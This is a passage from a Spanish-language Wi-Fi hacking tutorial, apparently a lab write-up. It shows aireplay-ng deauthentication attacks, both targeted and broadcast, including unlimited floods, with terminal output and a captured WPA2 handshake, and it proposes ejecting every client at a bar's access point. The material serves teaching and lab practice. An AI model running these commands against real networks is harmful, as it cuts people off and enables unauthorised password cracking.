&lt;span class=&quot;nt&quot;&gt;--fragment&lt;/span&gt;          : generates valid keystream   &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;--caffe-latte&lt;/span&gt;       : query a client &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;new IVs  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;--cfrag&lt;/span&gt;             : fragments against a client  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;--migmode&lt;/span&gt;           : attacks WPA migration mode  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;--test&lt;/span&gt;              : tests injection and quality &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Para este caso, nos interesa el parámetro ‘&lt;strong&gt;-0&lt;/strong&gt;’, el cual también puede ser usado con el parámetro
‘&lt;strong&gt;–deauth&lt;/strong&gt;’.&lt;/p&gt;

&lt;p&gt;La sintaxis sería la siguiente:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;aireplay-ng -0 10 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;CONSIDERACIONES&lt;/strong&gt;: Es necesario tener otra consola abierta monitorizando el AP objetivo, pues en caso de no
hacerlo, es probable que el ataque de deautenticación no funcione, pues &lt;strong&gt;aireplay&lt;/strong&gt; no sabe sobre qué canal
operar.&lt;/p&gt;

&lt;p&gt;Para el comando representado, lo que estamos haciendo es desde nuestro equipo de atacante enviar 10 paquetes
de de-autenticación a la estación objetivo, haciendo así que esta se desasocie de la red. Al igual que se han
especificado 10 paquetes, su valor puede incrementarse al valor deseado.&lt;/p&gt;

&lt;p&gt;Es posible incluso especificar un valor ‘&lt;strong&gt;0&lt;/strong&gt;’, haciéndole saber así a &lt;strong&gt;aireplay&lt;/strong&gt; que queremos enviar un
número infinito/ilimitado de paquetes de deautenticación a la estación objetivo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;aireplay-ng -0 0 -e hacklab -c 34:41:5D:46:D1:38 wlan0mon&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Esto mismo lo podríamos haber hecho especificando la dirección MAC del AP en vez de su &lt;strong&gt;ESSID&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;aireplay-ng -0 0 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Obteniendo los siguientes resultados:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[✗]─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#aireplay-ng -0 10 -a 20:34:FB:B1:C5:53 -c 34:41:5D:46:D1:38 wlan0mon&lt;/span&gt;
20:48:28  Waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;beacon frame &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BSSID: 20:34:FB:B1:C5:53&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on channel 1
20:48:29  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;34:41:5D:46:D1:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;18|65 ACKs]
20:48:29  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;34:41:5D:46:D1:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;11|63 ACKs]
20:48:30  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;34:41:5D:46:D1:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0|64 ACKs]
20:48:30  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;34:41:5D:46:D1:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14|66 ACKs]
20:48:31  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;34:41:5D:46:D1:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;17|63 ACKs]
20:48:32  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;34:41:5D:46:D1:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0|64 ACKs]
20:48:32  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;34:41:5D:46:D1:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;24|66 ACKs]
20:48:33  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;34:41:5D:46:D1:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0|64 ACKs]
20:48:33  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;34:41:5D:46:D1:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0|64 ACKs]
20:48:34  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;34:41:5D:46:D1:38] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0|64 ACKs]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora bien, para saber si nuestros paquetes están surtiendo efecto sobre la estación, el truco está en
contemplar el valor izquierdo que figura en los valores situados a la derecha del todo ‘&lt;strong&gt;[18|65 ACks]&lt;/strong&gt;’.
Siempre que este sea mayor que 0, ello querrá decir que nuestros paquetes están siendo enviados correctamente
a la estación.&lt;/p&gt;

&lt;p&gt;Si haces estas practicas en local, podrás comprobar cómo tu dispositivo en caso de haber sido la estación
víctima, habría sido desconectado del AP. Por otro lado, aunque lo veremos más adelante, imaginemos que ahora
paramos el ataque, ¿qué creéis que pasaría?. Fijaros que en la mayoría de las veces, los dispositivos tienden
a recordar los puntos de acceso a los que alguna vez han estado conectados.&lt;/p&gt;

&lt;p&gt;Esto es así debido a los paquetes &lt;strong&gt;Probe Request&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#tshark -i wlan0mon -Y 'wlan.fc.type_subtype==4' 2&amp;gt;/dev/null&lt;/span&gt;
   49 1.516614496 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;98, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  242 9.119006178 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;112, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  473 17.062963738 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;126, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  487 17.411192451 HonHaiPr_17:91:c0 → Broadcast    802.11 240 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;128, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  511 18.533411763 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2477, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
  512 18.552100778 IntelCor_46:d1:38 → Broadcast    802.11 285 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2479, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;hacklab
  513 18.556049394 IntelCor_46:d1:38 → Broadcast    802.11 278 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2480, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  515 18.649006729 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1719, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  516 18.650498757 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1720, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_DF12
  517 18.669117644 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1721, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  518 18.670480133 Google_71:cf:8c → Broadcast    802.11 208 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1722, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MOVISTAR_DF12
  519 18.691337428 Google_71:cf:8c → Broadcast    802.11 195 Probe Request, &lt;span class=&quot;nv&quot;&gt;SN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1723, &lt;span class=&quot;nv&quot;&gt;FN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0, &lt;span class=&quot;nv&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;........C, &lt;span class=&quot;nv&quot;&gt;SSID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Wildcard &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Broadcast&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y es justamente aquí donde está la gracia, pues de parar el ataque, el dispositivo lo que de manera automática
hará será reconectarse al AP, sin nosotros tener que hacer nada. Y es en este momento, donde se generará el Handshake:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CH  1 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 6 mins &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2019-08-08 20:54 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; WPA handshake: 20:34:FB:B1:C5:53                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&lt;/span&gt;
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  &lt;span class=&quot;nt&quot;&gt;-28&lt;/span&gt; 100     3564      684    2   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not associated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;   24:A2:E1:48:66:14  &lt;span class=&quot;nt&quot;&gt;-87&lt;/span&gt;    0 - 1      0        5                                                                                                                     
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  &lt;span class=&quot;nt&quot;&gt;-19&lt;/span&gt;    0e- 6e     0     2538  hacklab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si nos fijamos, en la parte superior, la propia suite nos indica &lt;strong&gt;WPA handshake&lt;/strong&gt; seguido de la dirección
 MAC del AP, debido a que se ha capturado el Handshake correspondiente al cliente que hemos deautenticado y
 que se acaba de reasociar.&lt;/p&gt;

&lt;p&gt;Jugaremos con el Handshake más adelante, veamos primero otras formas de obtener el Handshake.&lt;/p&gt;

&lt;p&gt;#### Ataque de deautenticación global&lt;/p&gt;

&lt;p&gt;Imaginemos ahora que estamos en un bar, un bar lleno de gente con un punto de acceso del propio
 establecimiento. En estos casos, cuando una red dispone de tantos clientes asociados, es más factible lanzar
 otro tipo de ataque, el &lt;strong&gt;ataque de deautenticación global&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;A diferencia del ataque de deautenticación dirigido, en el ataque de deautenticación global, se hace uso de
 una &lt;strong&gt;Broadcast MAC Address&lt;/strong&gt; como dirección MAC de estación objetivo a utilizar. Lo que conseguimos con esta
 dirección MAC, es expulsar a todos los clientes que se encuentren asociados el AP.&lt;/p&gt;

&lt;p&gt;Esto es mejor incluso, dado que siempre es probable que en una muestra de 20 clientes, 5 de ellos a lo mejor
 no se encuentren lo suficientemente cerca del router para elaborar el ataque (recordemos que esto se puede
 ver tanto desde el &lt;strong&gt;PWR&lt;/strong&gt; como a nivel de &lt;strong&gt;Frames&lt;/strong&gt; emitidos por la estación). En vez de estar por tanto
 deautenticando de cliente en cliente hasta dar con aquel que se encuentre a una distancia considerable como
 para que capturemos un Handshake, resulta más cómodo expulsarlos a todos.&lt;/p&gt;

&lt;p&gt;Basta con que uno de todos esos clientes se reconecte, para capturar un Handshake válido. Hay que tener en
 cuenta que es posible capturar múltiples Handshakes por parte de distintas estaciones en un mismo AP, pero
 esto no supone ningún problema.&lt;/p&gt;

&lt;p&gt;El ataque se puede elaborar de 2 formas, una es la siguiente:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;aireplay-ng -0 0 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Obteniendo los siguientes resultados:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#aireplay-ng -0 10 -e hacklab -c FF:FF:FF:FF:FF:FF wlan0mon&lt;/span&gt;
21:10:33  Waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;beacon frame &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ESSID: hacklab&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on channel 12
Found BSSID &lt;span class=&quot;s2&quot;&gt;&quot;20:34:FB:B1:C5:53&quot;&lt;/span&gt; to given ESSID &lt;span class=&quot;s2&quot;&gt;&quot;hacklab&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
21:10:33  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FF:FF:FF:FF:FF:FF] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FF:FF:FF:FF:FF:FF] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0| 0 ACKs]
21:10:34  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FF:FF:FF:FF:FF:FF] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0| 0 ACKs]
21:10:35  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FF:FF:FF:FF:FF:FF] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 1| 0 ACKs]
21:10:36  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FF:FF:FF:FF:FF:FF] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FF:FF:FF:FF:FF:FF] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0| 0 ACKs]
21:10:36  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FF:FF:FF:FF:FF:FF] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0| 0 ACKs]
21:10:37  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FF:FF:FF:FF:FF:FF] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 1| 0 ACKs]
21:10:37  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FF:FF:FF:FF:FF:FF] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 0| 0 ACKs]
21:10:38  Sending 64 directed DeAuth &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;code 7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; STMAC: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;FF:FF:FF:FF:FF:FF] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; 2| 0 ACKs]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y la otra sin especificar ninguna dirección MAC, lo que por defecto la suite interpretará como un ataque de
deautenticación global:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;aireplay-ng -0 0 -e hacklab wlan0mon&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Obteniendo estos resultados:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#aireplay-ng -0 10 -e hacklab wlan0mon&lt;/span&gt;
21:11:46  Waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;beacon frame &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ESSID: hacklab&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; on channel 12
Found BSSID &lt;span class=&quot;s2&quot;&gt;&quot;20:34:FB:B1:C5:53&quot;&lt;/span&gt; to given ESSID &lt;span class=&quot;s2&quot;&gt;&quot;hacklab&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
NB: this attack is more effective when targeting
a connected wireless client &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &amp;lt;client&lt;span class=&quot;s1&quot;&gt;'s mac&amp;gt;).
21:11:46  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:47  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:48  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:49  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:50  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
21:11:51  Sending DeAuth (code 7) to broadcast -- BSSID: [20:34:FB:B1:C5:53]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;ataque-de-autenticación&quot;&gt;Ataque de autenticación&lt;/h4&gt;

